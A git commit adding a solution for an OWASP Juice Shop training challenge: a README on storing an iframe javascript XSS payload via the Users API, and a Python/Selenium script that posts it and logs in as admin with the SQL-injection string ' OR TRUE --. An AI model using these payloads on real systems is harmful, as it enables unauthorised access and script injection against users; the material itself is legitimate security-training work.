db7709ac7ca90927962a3d364453e95569f5bf72
Roman Grewal <grps.hq@gmail.com>
2025-11-15 01:20:16 -0500

    client side xss protection

---
+++ solutions/level3/client-side-xss-protection/README.md
@@ -0,0 +1,11 @@
+## Client-side XSS Protection
+### Challenge: Perform a persisted XSS attack with `<iframe src="javascript:alert(\`xss\`)">` bypassing a client-side security mechanism.
+
+1. Submit a POST request to http://\<vm_ip\>:3000/api/Users (from the register page) with `{"email": "<iframe src=\"javascript:alert(\`xss\`)\">", "password": "xss"}` as body and `application/json` as `Content-Type` header.
+2. Log in to the application as admin.
+3. Visit http://\<vm_ip\>:3000/#/administration
+4. An alert box with the text "xss" should appear.
+5. In the network tab of your browser inspector, notice the `authentication-details` route with iframe source in the email key for the registered user
+6. When you scroll to the user in the registered user list, the alert box will popup again
+7. Click the "eye"-button of the iframe user (broken looking row in the Registered Users table)
+8. A modal overlay dialog with the user details opens where the attack string is rendered as harmless text. (Client-side security mechanism) - The adminstration page renders xss payloads from the `authentication-details` route outside the modal dialog
---
+++ solutions/level3/client-side-xss-protection/solution.py
@@ -0,0 +1,43 @@
+import requests
+import os
+import time
+from selenium import webdriver
+from selenium.webdriver.common.by import By
+from selenium.webdriver.support.ui import WebDriverWait
+from selenium.webdriver.support import expected_conditions as EC
+
+try:
+	headers = {
+		'Content-Type': 'application/json'
+	}
+
+	# Define the API endpoint URL
+	url = "http://192.168.0.118:3000/api/Users" # Example public API
+
+	# Prepare the JSON payload for the request body
+	payload = {"email": "<iframe src=\"javascript:alert(`xss`)\">", "password": "xss"}
+
+	# Send the POST request with the JSON payload
+	response = requests.post(url, json=payload, headers=headers)
+
+	# Print the response status code and JSON content
+	print(f"Status Code: {response.status_code}")
+	print(f"Response Body: {response.json()}")
+
+	IP_ADDRESS = os.environ['OWASP_JUICE_SHOP_IP_ADDRESS']
+	PORT = os.environ['OWASP_JUICE_SHOP_PORT']
+	driver = webdriver.Chrome()
+	driver.get(f"http://{IP_ADDRESS}:{PORT}")
+	WebDriverWait(driver, 20).until(EC.element_to_be_clickable((By.XPATH, "//button[contains(., 'Dismiss')]"))).click()
+	WebDriverWait(driver, 20).until(EC.element_to_be_clickable((By.XPATH, "//button[contains(., 'Account')]"))).click()
+	WebDriverWait(driver, 20).until(EC.element_to_be_clickable((By.XPATH, "//button[contains(., 'Login')]"))).click()
+	WebDriverWait(driver, 20).until(EC.element_to_be_clickable((By.ID, "email"))).send_keys("' OR TRUE --")
+	WebDriverWait(driver, 20).until(EC.element_to_be_clickable((By.ID, "password"))).send_keys("Password1!")
+	WebDriverWait(driver, 20).until(EC.element_to_be_clickable((By.XPATH, "//button[contains(., 'Log in')]"))).click()
+	time.sleep(3)
+	driver.get(f"http://{IP_ADDRESS}:{PORT}/#/administration")
+	
+	input("Press Enter...")
+
+finally:
+  driver.quit()
